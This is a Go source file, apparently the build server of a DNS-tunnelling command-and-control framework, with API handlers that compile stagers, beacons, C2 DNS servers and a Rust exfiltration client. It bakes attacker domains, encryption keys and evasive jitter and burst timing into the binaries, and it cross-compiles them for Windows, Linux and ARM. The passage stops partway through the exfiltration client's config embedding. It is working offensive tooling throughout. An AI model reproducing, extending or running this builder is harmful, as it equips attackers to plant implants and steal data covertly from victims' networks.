		api.failExfilBuildJob(jobID, fmt.Errorf("failed to prepare build metadata: %w", err))
		return
	}

	buildID := fmt.Sprintf("exfil_%d", time.Now().UnixNano())
	if err := api.db.SaveExfilClientBuild(&ExfilClientBuildRecord{
		ID:             buildID,
		Filename:       filename,
		OS:             req.Platform,
		Arch:           req.Architecture,
		Domains:        strings.Join(req.Domains, ","),
		Resolvers:      strings.Join(filterEmpty(req.Resolvers), ","),
		ServerIP:       req.ServerIP,
		ChunkBytes:     req.ChunkBytes,
		JitterMinMs:    req.JitterMinMs,
		JitterMaxMs:    req.JitterMaxMs,
		ChunksPerBurst: req.ChunksPerBurst,
		BurstPauseMs:   req.BurstPauseMs,
		FilePath:       savedPath,
		FileSize:       artifact.Size,
	}); err != nil {
		fmt.Printf("[Builder] Failed to record exfil build metadata: %v\n", err)
	}

	api.completeExfilBuildJob(jobID, "Exfil client build saved", artifact)
}

func (api *APIServer) handleGetExfilBuildJob(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	jobID := vars["id"]
	if jobID == "" {
		api.sendError(w, http.StatusBadRequest, "job id is required")
		return
	}

	job, ok := api.getExfilBuildJob(jobID)
	if !ok {
		api.sendError(w, http.StatusNotFound, "exfil build job not found")
		return
	}

	api.sendSuccess(w, "Exfil build job retrieved", job)
}

// handleBuildStager builds a stager binary with provided configuration
func (api *APIServer) handleBuildStager(w http.ResponseWriter, r *http.Request) {
	// Acquire build lock to prevent concurrent builds from interfering
	buildMutex.Lock()
	defer buildMutex.Unlock()

	var req StagerBuildRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		api.sendError(w, http.StatusBadRequest, "invalid request body")
		return
	}

	// Validate platform
	if req.Platform == "" {
		api.sendError(w, http.StatusBadRequest, "platform is required")
		return
	}

	// Default to amd64 if architecture not specified
	if req.Architecture == "" {
		req.Architecture = "amd64"
	}

	// Validate architecture
	validArchs := map[string]bool{"amd64": true, "386": true, "arm": true, "arm64": true, "armv7l": true}
	if !validArchs[req.Architecture] {
		api.sendError(w, http.StatusBadRequest, "invalid architecture: must be amd64, 386, arm, arm64, or armv7l")
		return
	}

	// Validate timing parameters with sensible defaults
	if req.JitterMinMs <= 0 {
		req.JitterMinMs = 60000 // 60 seconds default
	}
	if req.JitterMaxMs <= 0 {
		req.JitterMaxMs = 120000 // 120 seconds default
	}
	if req.JitterMaxMs < req.JitterMinMs {
		api.sendError(w, http.StatusBadRequest, "jitter_max_ms must be >= jitter_min_ms")
		return
	}
	if req.ChunksPerBurst <= 0 {
		req.ChunksPerBurst = 5 // 5 chunks per burst default
	}
	if req.BurstPauseMs < 0 {
		req.BurstPauseMs = 120000 // 120 seconds default
	}

	// Use global fallback DNS if not specified in request
	if req.FallbackDNS == "" {
		req.FallbackDNS = api.config.FallbackDNS
	}
	if req.FallbackDNS == "" {
		req.FallbackDNS = "8.8.8.8" // Ultimate fallback
	}

	// Note: client_binary_id is optional and just for UI tracking
	// The Master will automatically select the appropriate beacon based on OS when stager runs
	if req.ClientBinaryID != "" {
		fmt.Printf("[Builder] Building stager (will use client binary: %s when deployed)\n", req.ClientBinaryID)
	}

	// AUTO-SELECT DNS DOMAIN: Use ALL active DNS servers for load balancing
	// Stager will randomly pick domains for each chunk request
	if req.Domain == "" {
		dnsServers, err := api.db.GetDNSServers()
		if err != nil {
			api.sendError(w, http.StatusInternalServerError, "failed to query DNS servers")
			return
		}

		if len(dnsServers) == 0 {
			api.sendError(w, http.StatusBadRequest, "no DNS servers registered - build a DNS server first")
			return
		}

		// Collect ALL active DNS server domains
		var activeDomains []string
		for _, server := range dnsServers {
			if status, ok := server["status"].(string); ok && status == "active" {
				if domain, ok := server["domain"].(string); ok {
					activeDomains = append(activeDomains, domain)
				}
			}
		}

		if len(activeDomains) == 0 {
			api.sendError(w, http.StatusBadRequest, "no active DNS servers found - ensure DNS servers are running")
			return
		}

		// Join all domains with comma (stager will parse and randomly select)
		req.Domain = strings.Join(activeDomains, ",")
		fmt.Printf("[Builder] Building stager with Shadow Mesh client-side load balancing:\n")
		fmt.Printf("  └─ Embedded domains: %s\n", req.Domain)
		fmt.Printf("  └─ Stager will randomly distribute requests across %d DNS servers\n", len(activeDomains))
	}

	// Build the stager
	binaryPath, err := buildStager(req, api.config.SourceDir)
	if err != nil {
		stagerBuildID := fmt.Sprintf("%s-%s", req.Platform, req.Architecture)
		logPath := api.saveBuildLog("stager", stagerBuildID, []byte(err.Error()), err)
		errMsg := fmt.Sprintf("build failed: %v", err)
		if logPath != "" {
			errMsg += fmt.Sprintf("\nBuild log saved to: %s", relativeBuildPath(logPath))
		}
		api.sendError(w, http.StatusInternalServerError, errMsg)
		return
	}
	buildDir := filepath.Dir(binaryPath)
	defer os.RemoveAll(buildDir)

	// Save binary to builds directory
	ext := ""
	if req.Platform == "windows" {
		ext = ".exe"
	}
	filename := fmt.Sprintf("stager-%s-%s-%d%s", req.Platform, req.Architecture, time.Now().Unix(), ext)
	var stagerDomains []string
	if req.Domain != "" {
		for _, part := range strings.Split(req.Domain, ",") {
			trimmed := strings.TrimSpace(part)
			if trimmed != "" {
				stagerDomains = append(stagerDomains, trimmed)
			}
		}
	}
	metadata := &BuildMetadata{
		Platform:     req.Platform,
		Architecture: req.Architecture,
		Domains:      stagerDomains,
		Timing: &BuildTimingMetadata{
			JitterMinMs:    req.JitterMinMs,
			JitterMaxMs:    req.JitterMaxMs,
			ChunksPerBurst: req.ChunksPerBurst,
			BurstPauseMs:   req.BurstPauseMs,
		},
	}
	savedPath, err := api.saveBuild(binaryPath, filename, "stager", metadata)
	if err != nil {
		api.sendError(w, http.StatusInternalServerError, fmt.Sprintf("failed to save build: %v", err))
		return
	}
	fmt.Printf("Build saved to: %s\n", savedPath)

	// Queue cache for DNS servers (so they have the beacon ready when stager runs)
	clientBinaryID := req.ClientBinaryID

	// Log what we received
	if clientBinaryID != "" {
		fmt.Printf("[Builder] Building stager (will use client binary: %s when deployed)\n", clientBinaryID)
	}

	// Validate that the client binary exists
	if clientBinaryID != "" {
		clientBinaries, err := api.db.GetClientBinaries()
		if err == nil {
			found := false
			for _, binary := range clientBinaries {
				if id, ok := binary["id"].(string); ok && id == clientBinaryID {
					found = true
					if filename, ok := binary["filename"].(string); ok {
						fmt.Printf("[Builder] Found client binary: %s (ID: %s)\n", filename, id)
					}
					break
				}
			}
			if !found {
				fmt.Printf("[Builder] Warning: Client binary ID %s not found in database\n", clientBinaryID)
				clientBinaryID = "" // Clear invalid ID
			}
		}
	}

	// If still not set, auto-select most recent beacon for this platform
	if clientBinaryID == "" {
		clientBinaries, err := api.db.GetClientBinaries()
		if err == nil {
			for _, binary := range clientBinaries {
				if os, ok := binary["os"].(string); ok && os == req.Platform {
					if id, ok := binary["id"].(string); ok {
						clientBinaryID = id
						break
					}
				}
			}
		}
	}

	if clientBinaryID != "" {
		fmt.Printf("[Builder] Attempting to queue stager cache for client binary: %s\n", clientBinaryID)

		// Get all active DNS server IDs
		dnsServers, err := api.db.GetDNSServers()
		if err != nil {
			fmt.Printf("[Builder] Failed to get DNS servers: %v\n", err)
		} else {
			fmt.Printf("[Builder] Found %d DNS servers\n", len(dnsServers))

			var dnsServerIDs []string
			for _, server := range dnsServers {
				if status, ok := server["status"].(string); ok && status == "active" {
					if id, ok := server["id"].(string); ok {
						dnsServerIDs = append(dnsServerIDs, id)
						fmt.Printf("[Builder]   - Active DNS server: %s (status: %s)\n", id, status)
					}
				} else {
					if id, ok := server["id"].(string); ok {
						if status, ok := server["status"].(string); ok {
							fmt.Printf("[Builder]   - Skipping DNS server: %s (status: %s)\n", id, status)
						}
					}
				}
			}

			if len(dnsServerIDs) == 0 {
				fmt.Printf("[Builder] No active DNS servers found - cache not queued\n")
			} else {
				// Queue cache for all DNS servers
				fmt.Printf("[Builder] Queueing cache for %d active DNS servers...\n", len(dnsServerIDs))
				err = api.db.QueueStagerCacheForDNSServers(clientBinaryID, dnsServerIDs)
				if err != nil {
					fmt.Printf("[Builder] Failed to queue cache: %v (stager will still work via on-demand caching)\n", err)
				} else {
					fmt.Printf("[Builder] Queued stager cache (%s) for %d DNS servers (will sync on next checkin)\n",
						clientBinaryID, len(dnsServerIDs))
				}
			}
		}
	} else {
		fmt.Printf("[Builder]  No client binary ID - skipping cache queue\n")
	}

	artifact, err := newBuildArtifact("stager", filename, savedPath)
	if err != nil {
		api.sendError(w, http.StatusInternalServerError, "failed to prepare build metadata")
		return
	}

	api.sendSuccess(w, "Stager build saved", artifact)
}

// buildDNSServer compiles a DNS server with embedded configuration
func (api *APIServer) buildDNSServer(req DNSServerBuildRequest, masterURL, apiKey, serverID string) (string, error) {
	// Create temporary directory for build
	buildDir, err := os.MkdirTemp("", "dns-server-build-*")
	if err != nil {
		return "", fmt.Errorf("failed to create build directory: %w", err)
	}
	// NOTE: Caller is responsible for cleanup of buildDir

	// Copy Server source files to build directory
	serverSrcDir := filepath.Join(api.config.SourceDir, "Server")

	// Verify source directory exists
	if _, err := os.Stat(serverSrcDir); os.IsNotExist(err) {
		return "", fmt.Errorf("server source directory not found: %s\nEnsure 'source_dir' is set correctly in config and files were copied during installation", serverSrcDir)
	}

	if err := copyDir(serverSrcDir, buildDir); err != nil {
		return "", fmt.Errorf("failed to copy source: %w", err)
	}

	// Update config.go with embedded configuration
	configPath := filepath.Join(buildDir, "config.go")

	// Verify config.go exists after copy
	if _, err := os.Stat(configPath); os.IsNotExist(err) {
		// List what we have
		entries, _ := os.ReadDir(buildDir)
		var files []string
		for _, e := range entries {
			files = append(files, e.Name())
		}
		return "", fmt.Errorf("config.go not found in build directory after copy\nFiles present: %v\nSource: %s", files, serverSrcDir)
	}

	config, err := os.ReadFile(configPath)
	if err != nil {
		return "", fmt.Errorf("failed to read config: %w", err)
	}

	// Replace embedded config values in tryLoadEmbeddedConfig()
	// Note: Config uses specific alignment with tabs - must match exactly
	// Note: Replace ALL occurrences since there may be DefaultConfig() and tryLoadEmbeddedConfig()
	configStr := string(config)

	configStr = strings.ReplaceAll(configStr, "Domain:        \"example.com\",", fmt.Sprintf("Domain:        \"%s\",", req.Domain))
	configStr = strings.ReplaceAll(configStr, "NS1:           \"ns1.example.com\",", fmt.Sprintf("NS1:           \"%s\",", req.NS1))
	configStr = strings.ReplaceAll(configStr, "NS2:           \"ns2.example.com\",", fmt.Sprintf("NS2:           \"%s\",", req.NS2))

	// Verify Domain was replaced
	if strings.Contains(configStr, "Domain:        \"example.com\",") {
		return "", fmt.Errorf("domain replacement failed - example.com still present")
	}
	configStr = strings.ReplaceAll(configStr, "UpstreamDNS:   \"8.8.8.8:53\",", fmt.Sprintf("UpstreamDNS:   \"%s\",", req.UpstreamDNS))
	// ForwardDNS: if explicitly set to false, disable DNS forwarding (default is true)
	if req.ForwardDNS != nil && !*req.ForwardDNS {
		configStr = strings.ReplaceAll(configStr, "ForwardDNS:    true,", "ForwardDNS:    false,")
	}
	configStr = strings.ReplaceAll(configStr, "EncryptionKey: \"MySecretC2Key123!@#DefaultChange\",", fmt.Sprintf("EncryptionKey: \"%s\",", req.EncryptionKey))
	if req.ServerAddress != "" {
		configStr = strings.ReplaceAll(configStr, "SvrAddr:       \"1.2.3.4\",", fmt.Sprintf("SvrAddr:       \"%s\",", req.ServerAddress))
	}
	// Set distributed mode config (required fields) - replace ALL occurrences
	// Handle both with and without comments
	configStr = strings.ReplaceAll(configStr, "MasterServer:      \"\",", fmt.Sprintf("MasterServer:      \"%s\",", masterURL))
	configStr = strings.ReplaceAll(configStr, "MasterServer:      \"\", // REQUIRED: Set by builder", fmt.Sprintf("MasterServer:      \"%s\", // REQUIRED: Set by builder", masterURL))
	configStr = strings.ReplaceAll(configStr, "MasterAPIKey:      \"\",", fmt.Sprintf("MasterAPIKey:      \"%s\",", apiKey))
	configStr = strings.ReplaceAll(configStr, "MasterAPIKey:      \"\", // REQUIRED: Set by builder", fmt.Sprintf("MasterAPIKey:      \"%s\", // REQUIRED: Set by builder", apiKey))
	configStr = strings.ReplaceAll(configStr, "MasterServerID:    \"dns1\",", fmt.Sprintf("MasterServerID:    \"%s\",", serverID))

	// Verify MasterServer was set after replacement
	if strings.Contains(configStr, "MasterServer:      \"\",") {
		return "", fmt.Errorf("CRITICAL: MasterServer replacement failed - empty value still present in config")
	}

	// Verify all critical defaults were replaced
	criticalDefaults := map[string]string{
		"EncryptionKey": `EncryptionKey: "MySecretC2Key123!@#DefaultChange"`,
		"NS1":           `NS1:           "ns1.example.com"`,
		"NS2":           `NS2:           "ns2.example.com"`,
	}
	for field, defaultVal := range criticalDefaults {
		if strings.Contains(configStr, defaultVal) {
			return "", fmt.Errorf("%s replacement failed - default value still present in config", field)
		}
	}

	if err := os.WriteFile(configPath, []byte(configStr), 0644); err != nil {
		return "", fmt.Errorf("failed to write config: %w", err)
	}

	// Debug: Verify MasterServer was set
	if debugMode := false; debugMode {
		if strings.Contains(configStr, "MasterServer:   \"\",") {
			fmt.Println("WARNING: MasterServer still empty after replacement!")
		} else {
			fmt.Printf("MasterServer set to: %s\n", masterURL)
		}
	}

	// Clean and download dependencies to ensure compatible versions
	modTidyCmd := exec.Command("go", "mod", "tidy")
	modTidyCmd.Dir = buildDir
	modTidyCmd.Env = append(os.Environ(), "GOOS=linux", fmt.Sprintf("GOARCH=%s", runtime.GOARCH))
	if output, err := modTidyCmd.CombinedOutput(); err != nil {
		return "", fmt.Errorf("go mod tidy failed: %w\nOutput: %s", err, string(output))
	}

	// Build binary to temp location
	// CGO_ENABLED=0 produces a fully static binary with no glibc dependency
	outputPath := filepath.Join(buildDir, "dns-server")
	cmd := exec.Command("go", "build", "-trimpath", "-ldflags=-s -w", "-o", outputPath, ".")
	cmd.Dir = buildDir
	cmd.Env = append(os.Environ(), "CGO_ENABLED=0", "GOOS=linux", fmt.Sprintf("GOARCH=%s", runtime.GOARCH))

	output, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("build failed: %w\nOutput: %s", err, string(output))
	}

	// Verify binary was created
	if _, err := os.Stat(outputPath); os.IsNotExist(err) {
		// List directory contents for debugging
		entries, _ := os.ReadDir(buildDir)
		var fileList []string
		for _, e := range entries {
			fileList = append(fileList, e.Name())
		}
		return "", fmt.Errorf("build succeeded but binary not found at %s\nDirectory contents: %v\nBuild output: %s",
			outputPath, fileList, string(output))
	}

	return outputPath, nil
}

func generateBuildID() (string, error) {
	const charset = "abcdefghijklmnopqrstuvwxyz0123456789"
	b := make([]byte, 6)
	if _, err := rand.Read(b); err != nil {
		return "", err
	}
	for i := range b {
		b[i] = charset[b[i]%byte(len(charset))]
	}
	return string(b), nil
}

// buildClient compiles a client with embedded configuration
func buildClient(req ClientBuildRequest, sourceRoot, encryptionKey, buildID string) (string, error) {
	// Create temporary directory for build
	buildDir, err := os.MkdirTemp("", "client-build-*")
	if err != nil {
		return "", fmt.Errorf("failed to create build directory: %w", err)
	}
	// NOTE: Caller is responsible for cleanup of buildDir

	// Copy Client source files
	clientSrcDir := filepath.Join(sourceRoot, "Client")

	// Verify source directory exists
	if _, err := os.Stat(clientSrcDir); os.IsNotExist(err) {
		return "", fmt.Errorf("client source directory not found: %s\nEnsure 'source_dir' is set correctly in config and files were copied during installation", clientSrcDir)
	}

	if err := copyDir(clientSrcDir, buildDir); err != nil {
		return "", fmt.Errorf("failed to copy source: %w", err)
	}

	// Generate config.go from scratch (don't rely on existing file)
	configPath := filepath.Join(buildDir, "config.go")

	// Format DNS domains array
	domainsStr := "[]string{"
	for i, domain := range req.DNSDomains {
		if i > 0 {
			domainsStr += ", "
		}
		domainsStr += fmt.Sprintf("%q", domain)
	}
	domainsStr += "}"

	// Normalize resolver - ensure it has port if specified
	resolver := strings.TrimSpace(req.Resolver)
	if resolver != "" && !strings.Contains(resolver, ":") {
		resolver = resolver + ":53"
	}

	// Determine encoding mode from the Encrypted flag
	encodingMode := "aes-gcm-base36"
	if req.Encrypted != nil && !*req.Encrypted {
		encodingMode = "base36"
	}

	// Resolve per-phase config with fallback to global settings
	globalEncrypted := req.Encrypted == nil || *req.Encrypted

	regQT := "TXT"
	regEnc := globalEncrypted
	regMaxPayload := 0
	regPayloadFmt := ""
	regACKIP := ""
	if req.RegistrationPhase != nil {
		if req.RegistrationPhase.QueryType != "" {
			regQT = req.RegistrationPhase.QueryType
		}
		if req.RegistrationPhase.Encrypted != nil {
			regEnc = *req.RegistrationPhase.Encrypted
		}
		regMaxPayload = req.RegistrationPhase.MaxPayload
		regPayloadFmt = req.RegistrationPhase.PayloadFormat
		regACKIP = req.RegistrationPhase.ARecordACKIP
	}

	pollQT := "TXT"
	pollEnc := globalEncrypted
	pollMaxPayload := 0
	pollPayloadFmt := ""
	pollACKIP := ""
	pollTaskIP := ""
	txtFollowUp := 0
	if req.PollPhase != nil {
		if req.PollPhase.QueryType != "" {
			pollQT = req.PollPhase.QueryType
		}
		if req.PollPhase.Encrypted != nil {
			pollEnc = *req.PollPhase.Encrypted
		}
		pollMaxPayload = req.PollPhase.MaxPayload
		pollPayloadFmt = req.PollPhase.PayloadFormat
		pollACKIP = req.PollPhase.ARecordACKIP
		pollTaskIP = req.PollPhase.ARecordTaskIP
		txtFollowUp = req.PollPhase.TxtFollowUpSecs
	}

	exfilQT := "TXT"
	exfilEnc := globalEncrypted
	exfilMaxPayload := 0
	exfilPayloadFmt := ""
	exfilACKIP := ""
	if req.DataExfilPhase != nil {
		if req.DataExfilPhase.QueryType != "" {
			exfilQT = req.DataExfilPhase.QueryType
		}
		if req.DataExfilPhase.Encrypted != nil {
			exfilEnc = *req.DataExfilPhase.Encrypted
		}
		exfilMaxPayload = req.DataExfilPhase.MaxPayload
		exfilPayloadFmt = req.DataExfilPhase.PayloadFormat
		exfilACKIP = req.DataExfilPhase.ARecordACKIP
	}

	serverDomain := ""
	if len(req.DNSDomains) > 0 {
		serverDomain = req.DNSDomains[0]
	}

	configContent := fmt.Sprintf(`package main

// This file is auto-generated at build time by the Master builder
// DO NOT EDIT MANUALLY

var embeddedConfig = Config{
	ServerDomain:         %q,
	DNSDomains:          %s,
	DomainSelectionMode: "random",
	DNSServer:            %q,
	QueryType:            "TXT",
	Encoding:             %q,
	EncryptionKey:        %q,
	Timeout:              10,
	MaxCommandLength:     400,
	RetryAttempts:        3,
	SleepMin:             %d,
	SleepMax:             %d,
	ExfilJitterMinMs:     %d,
	ExfilJitterMaxMs:     %d,
	ExfilChunksPerBurst:  %d,
	ExfilBurstPauseMs:    %d,
	MaxSubdomainLength:   %d,
	PayloadFormat:        %q,
	BeaconName:           %q,
	BuildID:              %q,
	StagedRegistration:   %t,
	Registration: PhaseConfig{
		QueryType:     %q,
		Encrypted:     %t,
		MaxPayload:    %d,
		PayloadFormat: %q,
		ARecordACKIP:  %q,
	},
	Poll: PollPhaseConfig{
		PhaseConfig: PhaseConfig{
			QueryType:     %q,
			Encrypted:     %t,
			MaxPayload:    %d,
			PayloadFormat: %q,
			ARecordACKIP:  %q,
		},
		ARecordTaskIP:   %q,
		TxtFollowUpSecs: %d,
	},
	DataExfil: PhaseConfig{
		QueryType:     %q,
		Encrypted:     %t,
		MaxPayload:    %d,
		PayloadFormat: %q,
		ARecordACKIP:  %q,
	},
}

func getConfig() Config {
	return embeddedConfig
}
`, serverDomain, domainsStr, resolver, encodingMode, encryptionKey,
		req.SleepMin, req.SleepMax, req.ExfilJitterMinMs, req.ExfilJitterMaxMs,
		req.ExfilChunksPerBurst, req.ExfilBurstPauseMs, req.MaxSubdomainLength,
		req.PayloadFormat, req.BeaconName, buildID, req.StagedRegistration,
		regQT, regEnc, regMaxPayload, regPayloadFmt, regACKIP,
		pollQT, pollEnc, pollMaxPayload, pollPayloadFmt, pollACKIP,
		pollTaskIP, txtFollowUp,
		exfilQT, exfilEnc, exfilMaxPayload, exfilPayloadFmt, exfilACKIP)

	if err := os.WriteFile(configPath, []byte(configContent), 0644); err != nil {
		return "", fmt.Errorf("failed to write config: %w", err)
	}

	// Clean and download dependencies
	modTidyCmd := exec.Command("go", "mod", "tidy")
	modTidyCmd.Dir = buildDir
	if output, err := modTidyCmd.CombinedOutput(); err != nil {
		return "", fmt.Errorf("go mod tidy failed: %w\nOutput: %s", err, string(output))
	}

	// Build binary to temp location
	ext := ""
	goos := "linux"
	if req.Platform == "windows" {
		ext = ".exe"
		goos = "windows"
	}

	// Map architecture - armv7l uses GOARCH=arm with GOARM=7
	// CGO_ENABLED=0 produces a fully static binary with no glibc dependency
	goarch := req.Architecture
	cgoEnabled := "1"
	if req.StaticLink {
		cgoEnabled = "0" // Disable CGO for static linking
	}
	env := append(os.Environ(), fmt.Sprintf("CGO_ENABLED=%s", cgoEnabled), fmt.Sprintf("GOOS=%s", goos))
	if req.Architecture == "armv7l" {
		goarch = "arm"
		env = append(env, "GOARCH=arm", "GOARM=7")
	} else {
		env = append(env, fmt.Sprintf("GOARCH=%s", goarch))
	}

	outputPath := filepath.Join(buildDir, fmt.Sprintf("beacon%s", ext))
	cmd := exec.Command("go", "build", "-trimpath", "-ldflags=-s -w", "-o", outputPath, ".")
	cmd.Dir = buildDir
	cmd.Env = env

	output, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("build failed: %w\nOutput: %s", err, string(output))
	}

	// Verify binary was created
	if _, err := os.Stat(outputPath); os.IsNotExist(err) {
		return "", fmt.Errorf("build succeeded but binary not found at %s\nBuild output: %s", outputPath, string(output))
	}

	return outputPath, nil
}

// buildExfilClient compiles the Rust-based exfiltration client with embedded configuration
func buildExfilClient(req ExfilClientBuildRequest, sourceRoot, encryptionKey string, targetCfg rustTargetConfig, serverIPs []string) (string, error) {
	if encryptionKey == "" {
		return "", fmt.Errorf("encryption key is required to embed configuration")
	}

	exfilSrcDir := filepath.Join(sourceRoot, "exfil-client")
	if _, err := os.Stat(exfilSrcDir); os.IsNotExist(err) {
		return "", fmt.Errorf("exfil client source directory not found: %s", exfilSrcDir)
	}

	buildDir, err := os.MkdirTemp("", "exfil-build-*")
	if err != nil {
		return "", fmt.Errorf("failed to create build directory: %w", err)
	}

	if err := copyDir(exfilSrcDir, buildDir); err != nil {
		return "", fmt.Errorf("failed to copy exfil client sources: %w", err)
	}

	if err := embedExfilConfig(buildDir, req, encryptionKey, serverIPs); err != nil {
		return "", err
	}

	args := []string{"build", "--release", "--locked"}
	if targetCfg.triple != "" {
		args = append(args, "--target", targetCfg.triple)
	}

	if err := writeCargoConfig(buildDir, targetCfg); err != nil {
		return "", err
	}

	cargoPath, err := resolveCargoBinary()
	if err != nil {
		return "", err
	}

	cmd := exec.Command(cargoPath, args...)
	cmd.Dir = buildDir
	cmd.Env = os.Environ()

	if output, err := cmd.CombinedOutput(); err != nil {
		return "", fmt.Errorf("cargo build failed: %w\nOutput: %s", err, string(output))
	}

	targetDir := filepath.Join(buildDir, "target")
	if targetCfg.triple != "" {
		targetDir = filepath.Join(targetDir, targetCfg.triple)
	}

	binaryPath := filepath.Join(targetDir, "release", "exfil-client")
	ext := ""
	if req.Platform == "windows" {
		ext = ".exe"
		binaryPath += ".exe"
	}

	if _, err := os.Stat(binaryPath); err != nil {
		return "", fmt.Errorf("build succeeded but binary not found at %s: %w", binaryPath, err)
	}

	finalPath := filepath.Join(buildDir, fmt.Sprintf("exfil-client%s", ext))
	if err := copyFile(binaryPath, finalPath); err != nil {
		return "", fmt.Errorf("failed to copy exfil binary: %w", err)
	}

	return finalPath, nil
}

// buildStager compiles a stager with embedded configuration
func buildStager(req StagerBuildRequest, sourceRoot string) (string, error) {
	// Stager is in C, needs different build process
	// Create temporary directory
	buildDir, err := os.MkdirTemp("", "stager-build-*")
	if err != nil {
		return "", fmt.Errorf("failed to create build directory: %w", err)
	}
	// NOTE: Caller is responsible for cleanup of buildDir

	// Copy Stager source files
	stagerSrcDir := filepath.Join(sourceRoot, "Stager")
	if err := copyDir(stagerSrcDir, buildDir); err != nil {
		return "", fmt.Errorf("failed to copy source: %w", err)
	}

	// Update stager.c with domain and timing configuration
	stagerPath := filepath.Join(buildDir, "stager.c")
	stagerCode, err := os.ReadFile(stagerPath)
	if err != nil {
		return "", fmt.Errorf("failed to read stager.c: %w", err)
	}

	codeStr := string(stagerCode)
	// Note: stager.c has extra spaces and comments - must match exactly
	// Replace C2_DOMAINS with comma-separated list of all active DNS domains
	escapeCStr := func(s string) string {
		s = strings.ReplaceAll(s, `\`, `\\`)
		s = strings.ReplaceAll(s, `"`, `\"`)
		return s
	}
	codeStr = strings.Replace(codeStr, `#define C2_DOMAINS "secwolf.net"`, fmt.Sprintf(`#define C2_DOMAINS "%s"`, escapeCStr(req.Domain)), 1)
	codeStr = strings.Replace(codeStr, `#define MIN_CHUNK_DELAY_MS 60000`, fmt.Sprintf(`#define MIN_CHUNK_DELAY_MS %d`, req.JitterMinMs), 1)
	codeStr = strings.Replace(codeStr, `#define MAX_CHUNK_DELAY_MS 120000`, fmt.Sprintf(`#define MAX_CHUNK_DELAY_MS %d`, req.JitterMaxMs), 1)
	codeStr = strings.Replace(codeStr, `#define CHUNKS_PER_BURST 5`, fmt.Sprintf(`#define CHUNKS_PER_BURST %d`, req.ChunksPerBurst), 1)
	codeStr = strings.Replace(codeStr, `#define BURST_PAUSE_MS 120000`, fmt.Sprintf(`#define BURST_PAUSE_MS %d`, req.BurstPauseMs), 1)
	codeStr = strings.Replace(codeStr, `#define FALLBACK_DNS "8.8.8.8"`, fmt.Sprintf(`#define FALLBACK_DNS "%s"`, escapeCStr(req.FallbackDNS)), 1)
	// DNS_RESOLVER: empty string means use system resolver, otherwise use specified resolver
	resolver := strings.TrimSpace(req.Resolver)
	codeStr = strings.Replace(codeStr, `#define DNS_RESOLVER ""`, fmt.Sprintf(`#define DNS_RESOLVER "%s"`, escapeCStr(resolver)), 1)

	if err := os.WriteFile(stagerPath, []byte(codeStr), 0644); err != nil {
		return "", fmt.Errorf("failed to write stager.c: %w", err)
	}

	// Build using direct gcc/mingw compilation (no make required)
	ext := ""
	var cmd *exec.Cmd

	// Map architecture for build flags
	var archFlag string
	var mingwTarget string

	switch req.Architecture {
	case "amd64":
		archFlag = "-m64"
		mingwTarget = "x86_64-w64-mingw32-gcc"
	case "386":
		archFlag = "-m32"
		mingwTarget = "i686-w64-mingw32-gcc"
	case "arm64":
		archFlag = "" // GCC handles this via -march
		mingwTarget = "aarch64-w64-mingw32-gcc"
	case "armv7l", "arm":
		archFlag = "-march=armv7-a"
		mingwTarget = "arm-linux-gnueabihf-gcc"
	default:
		archFlag = "-m64"
		mingwTarget = "x86_64-w64-mingw32-gcc"
	}

	outputPath := filepath.Join(buildDir, fmt.Sprintf("stager-%s-%s%s", req.Platform, req.Architecture, ext))

	if req.Platform == "windows" {
		ext = ".exe"
		outputPath = filepath.Join(buildDir, fmt.Sprintf("stager-%s-%s%s", req.Platform, req.Architecture, ext))

		// Windows: Use mingw-w64 cross-compiler
		args := []string{"-Wall", "-O2", "-s", "stager.c", "-o", filepath.Base(outputPath), "-lws2_32", "-lz", "-static"}
		cmd = exec.Command(mingwTarget, args...)
	} else {
		// Linux: Use standard gcc or cross-compiler for ARM
		args := []string{"-Wall", "-O2", "-s"}
		if req.StaticLink {
			// Use -static for glibc-independent binaries that work on older systems
			args = append(args, "-static")
		}
		if archFlag != "" {
			args = append(args, archFlag)
		}
		args = append(args, "stager.c", "-o", filepath.Base(outputPath), "-lz")

		// Use cross-compiler for ARM, standard gcc for x86
		if req.Architecture == "armv7l" || req.Architecture == "arm" {
			cmd = exec.Command("arm-linux-gnueabihf-gcc", args...)
		} else if req.Architecture == "arm64" {
			cmd = exec.Command("aarch64-linux-gnu-gcc", args...)
		} else {
			cmd = exec.Command("gcc", args...)
		}
	}

	cmd.Dir = buildDir
	output, err := cmd.CombinedOutput()
	if err != nil {
		// Provide helpful error for missing zlib
		if strings.Contains(string(output), "zlib.h: No such file or directory") {
			return "", fmt.Errorf("build failed: zlib development headers not found\n"+
				"Install with: sudo apt-get install zlib1g-dev\n"+
				"Original error: %w\nOutput: %s", err, string(output))
		}
		return "", fmt.Errorf("build failed: %w\nOutput: %s", err, string(output))
	} // Verify binary was created
	if _, err := os.Stat(outputPath); os.IsNotExist(err) {
		return "", fmt.Errorf("build succeeded but binary not found at %s\nBuild output: %s", outputPath, string(output))
	}

	return outputPath, nil
}

// Helper functions

func copyDir(src, dst string) error {
	return filepath.Walk(src, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}

		relPath, err := filepath.Rel(src, path)
		if err != nil {
			return err
		}

		targetPath := filepath.Join(dst, relPath)

		if info.IsDir() {
			return os.MkdirAll(targetPath, info.Mode())
		}

		return copyFile(path, targetPath)
	})
}

func copyFile(src, dst string) error {
	sourceFile, err := os.Open(src)
	if err != nil {
		return err
	}
	defer sourceFile.Close()

	destFile, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer destFile.Close()

	_, err = io.Copy(destFile, sourceFile)
	return err
}

func embedExfilConfig(buildDir string, req ExfilClientBuildRequest, encryptionKey string, serverIPs []string) error {
	configPath := filepath.Join(buildDir, "src", "config.rs")
	data, err := os.ReadFile(configPath)
	if err != nil {
		return fmt.Errorf("failed to read exfil config.rs: %w", err)
	}

	if len(filterEmpty(req.Domains)) == 0 {
		return fmt.Errorf("at least one domain is required for exfil client builds")
	}

	exfilEncrypted := req.Encrypted == nil || *req.Encrypted

	replacement := fmt.Sprintf(`static EMBEDDED: Lazy<Config> = Lazy::new(|| Config {
	encryption_key: "%s".to_string(),
	domains: %s,
	resolvers: %s,
	server_ips: %s,
	chunk_bytes: %d,
	jitter_min_ms: %d,
	jitter_max_ms: %d,
	chunks_per_burst: %d,
	burst_pause_ms: %d,
	chunk_retry_attempts: default_chunk_retry_attempts(),
